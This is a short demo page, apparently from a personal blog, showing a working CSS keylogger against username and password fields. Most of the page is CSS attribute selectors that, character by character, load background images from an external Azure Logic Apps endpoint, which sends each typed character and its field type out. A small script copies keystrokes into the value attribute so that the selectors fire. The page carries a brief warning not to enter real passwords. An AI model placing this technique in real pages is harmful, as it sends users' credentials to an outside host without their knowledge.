---
title: "An example of a CSS keylogger"
date: 2019-08-14T11:33:46+10:00
draft: false
hidden: true
---

A demo of a CSS keylogger in action. Note - this **does** make requests when you type into the field so just be aware of that, so don't enter a real password! 😜

<input type="text" placeholder="Username" />
<br />
<input type="password" placeholder="Password" />

<script data-preview-code>
let inputs = document.getElementsByTagName("input");

for (let i = 0; i < inputs.length; i++) {
    let input = inputs[i];

    input.addEventListener("keypress", e => {
        e.preventDefault();
        let char = String.fromCharCode(e.keyCode);
        let newValue = input.value + char;
        input.setAttribute("value", newValue);
        input.setSelectionRange(newValue.length, newValue.length);
    });
}
</script>

<style>
input[type=text][value$=a] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=a&type=username');
}
input[type=password][value$=a] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=a&type=password');
}

input[type=text][value$=b] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=b&type=username');
}
input[type=password][value$=b] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=b&type=password');
}

input[type=text][value$=c] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=c&type=username');
}
input[type=password][value$=c] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=c&type=password');
}

input[type=text][value$=d] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=d&type=username');
}
input[type=password][value$=d] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=d&type=password');
}

input[type=text][value$=e] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=e&type=username');
}
input[type=password][value$=e] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=e&type=password');
}

input[type=text][value$=f] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=f&type=username');
}
input[type=password][value$=f] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=f&type=password');
}

input[type=text][value$=g] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=g&type=username');
}
input[type=password][value$=g] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=g&type=password');
}

input[type=text][value$=h] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=h&type=username');
}
input[type=password][value$=h] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=h&type=password');
}

input[type=text][value$=i] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=i&type=username');
}
input[type=password][value$=i] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=i&type=password');
}

input[type=text][value$=j] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=j&type=username');
}
input[type=password][value$=j] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=j&type=password');
}

input[type=text][value$=k] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=k&type=username');
}
input[type=password][value$=k] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=k&type=password');
}

input[type=text][value$=l] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=l&type=username');
}
input[type=password][value$=l] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=l&type=password');
}

input[type=text][value$=m] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=m&type=username');
}
input[type=password][value$=m] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=m&type=password');
}

input[type=text][value$=n] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=n&type=username');
}
input[type=password][value$=n] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=n&type=password');
}

input[type=text][value$=o] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=o&type=username');
}
input[type=password][value$=o] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=o&type=password');
}

input[type=text][value$=p] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=p&type=username');
}
input[type=password][value$=p] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=p&type=password');
}

input[type=text][value$=q] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=q&type=username');
}
input[type=password][value$=q] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=q&type=password');
}

input[type=text][value$=r] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=r&type=username');
}
input[type=password][value$=r] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=r&type=password');
}

input[type=text][value$=s] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=s&type=username');
}
input[type=password][value$=s] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=s&type=password');
}

input[type=text][value$=t] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=t&type=username');
}
input[type=password][value$=t] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=t&type=password');
}

input[type=text][value$=u] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=u&type=username');
}
input[type=password][value$=u] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=u&type=password');
}

input[type=text][value$=v] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=v&type=username');
}
input[type=password][value$=v] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=v&type=password');
}

input[type=text][value$=w] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=w&type=username');
}
input[type=password][value$=w] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=w&type=password');
}

input[type=text][value$=x] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=x&type=username');
}
input[type=password][value$=x] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=x&type=password');
}

input[type=text][value$=y] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=y&type=username');
}
input[type=password][value$=y] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=y&type=password');
}

input[type=text][value$=z] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=z&type=username');
}
input[type=password][value$=z] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=z&type=password');
}

input[type=text][value$=1] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=1&type=username');
}
input[type=password][value$=1] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=1&type=password');
}

input[type=text][value$=2] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=2&type=username');
}
input[type=password][value$=2] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=2&type=password');
}

input[type=text][value$=3] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=3&type=username');
}
input[type=password][value$=3] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=3&type=password');
}

input[type=text][value$=4] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=4&type=username');
}
input[type=password][value$=4] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=4&type=password');
}

input[type=text][value$=5] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=5&type=username');
}
input[type=password][value$=5] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=5&type=password');
}

input[type=text][value$=6] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=6&type=username');
}
input[type=password][value$=6] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=6&type=password');
}

input[type=text][value$=7] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=7&type=username');
}
input[type=password][value$=7] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=7&type=password');
}

input[type=text][value$=8] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=8&type=username');
}
input[type=password][value$=8] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=8&type=password');
}

input[type=text][value$=9] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=9&type=username');
}
input[type=password][value$=9] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=9&type=password');
}

input[type=text][value$=0] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=0&type=username');
}
input[type=password][value$=0] {
  background-image: url('https://prod-04.australiaeast.logic.azure.com:443/workflows/1e48855ebb594d1b909635833cded0f2/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=p-S3I29hwmF5ayHFs12fJ_UvBa6g5YvAIDinkoB465E&char=0&type=password');
}
</style>
